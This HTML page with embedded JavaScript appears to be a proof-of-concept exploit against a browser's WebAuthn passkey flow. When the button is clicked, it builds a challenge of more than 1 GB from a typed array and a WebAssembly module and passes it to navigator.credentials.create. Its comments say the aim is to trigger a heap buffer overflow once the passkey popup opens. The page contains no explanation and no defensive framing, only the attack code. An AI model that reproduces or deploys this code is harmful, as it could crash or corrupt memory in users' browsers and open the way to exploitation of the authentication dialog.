<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Create Passkey with WebAssembly</title>
</head>
<body>
    <h1>Create a Passkey</h1>
    <button id="createPasskeyButton">Create Passkey</button>

    <script>
        // Function to load the WebAssembly module from a file
        async function loadWasmModule() {
            try {
                // Fetch the .wasm file from the server
                const response = await fetch('wasmModule.wasm');  // Ensure this file exists in the same directory
                if (!response.ok) {
                    throw new Error(`Failed to fetch the WASM file: ${response.statusText}`);
                }

                const wasmArrayBuffer = await response.arrayBuffer();

                if (wasmArrayBuffer.byteLength === 0) {
                    throw new Error('The WASM file is empty or not correctly loaded.');
                }

                // Instantiate the WebAssembly module
                const wasmModule = await WebAssembly.instantiate(wasmArrayBuffer);
                return wasmModule.instance.exports;
            } catch (error) {
                console.error('Error loading WebAssembly module:', error);
                throw error;
            }
        }

        // Function to trigger passkey creation
        async function createPasskeyWithWasm() {
            try {
                // Load the WebAssembly module
                const wasmExports = await loadWasmModule();

                // This is where we'll delay the buffer overflow until the passkey creation process begins
                let largeChallenge;

                // Simulate the popup by creating a large array only when WebAuthn process starts
                document.getElementById('createPasskeyButton').disabled = true; // Disable the button to simulate popup opening

                // We simulate the heap buffer overflow here, which only happens after the WebAuthn popup is triggered
                setTimeout(() => {
                    try {
                        // Simulate buffer overflow after WebAuthn popup is triggered (challenge is huge)
                        console.log("Triggering heap buffer overflow (large challenge data generation)...");

                        // Creating a 1 GB buffer for challenge (which will cause overflow)
                        largeChallenge = new Uint8Array(1024 * 1024 * 1024);  // 1 GB array

                        // Here you could use WASM function to generate the challenge if needed
                        const wasmChallenge = wasmExports.generateChallenge(1024 * 1024 * 1024); // Calling WASM to create challenge data

                        // Combine both challenges (this part is optional depending on use case)
                        const finalChallenge = new Uint8Array(largeChallenge.length + wasmChallenge.length);
                        finalChallenge.set(largeChallenge);
                        finalChallenge.set(wasmChallenge, largeChallenge.length);

                        const publicKeyCredentialCreationOptions = {
                            rp: {
                                name: "ProDev Hacker",
                                id: window.location.hostname
                            },
                            user: {
                                id: new Uint8Array([1, 2, 3, 4]),
                                name: "user@example.com",
                                displayName: "User Name"
                            },
                            pubKeyCredParams: [
                                { type: "public-key", alg: -7 },  // ES256
                                { type: "public-key", alg: -257 } // RS256
                            ],
                            timeout: 60000,
                            challenge: finalChallenge,  // Use the challenge generated from WASM and overflow data
                            attestation: "none"
                        };

                        // Create passkey using Web Authentication API
                        navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions })
                            .then((credential) => {
                                console.log("Passkey created:", credential);
                            })
                            .catch((error) => {
                                console.error("Error creating passkey:", error);
                            });

                    } catch (overflowError) {
                        console.error("Heap buffer overflow occurred:", overflowError);
                    }
                }, 0); // Delay to simulate the "popup" opening and buffer creation happening after

            } catch (error) {
                console.error("Error creating passkey:", error);
            }
        }

        // Event listener for button click to initiate passkey creation and WebAuthn process
        document.getElementById('createPasskeyButton').addEventListener('click', createPasskeyWithWasm);
    </script>
</body>
</html>
